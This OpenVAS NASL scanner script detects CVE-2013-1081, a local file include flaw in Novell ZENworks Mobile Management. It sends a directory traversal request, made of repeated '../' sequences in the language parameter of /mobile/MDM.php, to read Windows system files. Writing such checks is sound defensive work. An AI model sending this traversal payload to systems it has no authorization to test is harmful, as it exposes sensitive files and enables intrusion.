###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_novell_zenworks_mobile_management_58402.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# Novell ZENworks Mobile Management  Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################
CPE = "cpe:/a:novell:zenworks_mobile_management";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103734");
  script_bugtraq_id(58402);
  script_cve_id("CVE-2013-1081");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("$Revision: 11865 $");

  script_name("Novell ZENworks Mobile Management  Local File Include Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/58402");
  script_xref(name:"URL", value:"http://www.novell.com/support/kb/doc.php?id=7011895");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-06-10 13:05:34 +0200 (Mon, 10 Jun 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_novell_zenworks_mobile_management_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("zenworks_mobile_management/installed");
  script_tag(name:"solution", value:"Updates are available. Please see the references or vendor advisory
for more information.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"Novell ZENworks Mobile Management is prone to a local file include
vulnerability because it fails to adequately validate user-
supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information and execute arbitrary local scripts. This could
allow the attacker to compromise the application and the computer.
Other attacks are also possible.

Novell ZENworks Mobile Management 2.6.0, 2.6.1 and 2.7.0 are vulnerable.");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");


if(!port = get_app_port(cpe:CPE))exit(0);

files = traversal_files('windows');

foreach file (keys(files)) {

  url = '/mobile/MDM.php?language=res/languages/' + crap(data:"../", length:6*9) + files[file];

  if(http_vuln_check(port:port, url:url,pattern:file)) {

   security_message(port:port);
   exit(0);

 }

}

exit(99);

